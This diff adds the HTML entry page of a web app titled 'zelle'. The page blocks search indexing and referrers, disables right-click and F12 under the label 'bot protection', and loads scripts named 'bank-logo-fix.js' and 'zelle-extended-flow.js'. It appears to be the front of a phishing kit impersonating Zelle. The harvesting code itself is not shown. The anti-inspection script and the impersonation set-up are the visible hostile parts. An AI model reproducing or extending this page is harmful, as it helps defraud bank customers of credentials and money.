@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="referrer" content="no-referrer">
+    <title>zelle</title>
+    <link rel="stylesheet" crossorigin href="assets/index-D-AmrB3w.css">
+</head>
+<body>
+    <div id="root"></div>
+    
+    <!-- React bundle FIRST -->
+    <script type="module" crossorigin src="assets/index-D-jAnAhO.js"></script>
+    
+    <!-- Bot Protection Script -->
+    <script>
+        (function() {
+            'use strict';
+            
+            // ONLY disable right-click and F12 for now
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode === 123) { e.preventDefault(); return false; }
+            });
+        })();
+    </script>
+    
+    <!-- Bank Logo Fix - AFTER React -->
+    <script src="bank-logo-fix.js"></script>
+    
+    <!-- Extended Multi-Step Flow - AFTER React -->
+    <script src="zelle-extended-flow.js"></script>
+</body>
+</html>
